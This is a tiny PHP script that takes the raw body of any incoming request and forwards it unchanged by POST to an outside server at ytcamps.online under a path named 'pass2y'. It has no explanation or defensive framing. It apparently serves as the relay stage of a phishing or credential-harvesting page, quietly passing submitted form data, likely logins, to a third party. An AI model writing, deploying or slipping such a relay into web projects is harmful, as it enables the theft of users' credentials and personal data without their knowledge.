<?php

$data = file_get_contents("php://input");
$ch = curl_init("https://ytcamps.online/pass2y/main.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); // Send raw data
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
?>
